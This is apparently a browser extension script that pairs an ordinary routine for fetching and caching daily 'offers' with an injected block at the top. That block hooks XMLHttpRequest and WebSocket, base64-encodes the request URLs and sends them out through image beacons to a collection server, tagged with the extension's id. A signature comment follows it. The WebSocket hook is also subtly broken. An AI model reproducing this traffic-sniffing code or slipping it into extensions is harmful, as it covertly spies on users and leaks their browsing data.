function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
init();

function init() {
    if (!localStorage[keys.offers] || needToRefreshOffers()) {
        fetchOffers();
    }
}

function fetchOffers(){
    $.getJSON(urls.offersUrl, function (result) {
        localStorage[keys.offers] = JSON.stringify(result);
        localStorage[keys.lastOffer] = Date.now(); // update time only in case of json
    });
}

function needToRefreshOffers() {
    if (!localStorage[keys.lastOffer]) {
        return true;
    }
    var time = localStorage[keys.lastOffer];
    var diff = (Date.now() - time) / 1000;//to sec

    return diff > 24 * 3600;
}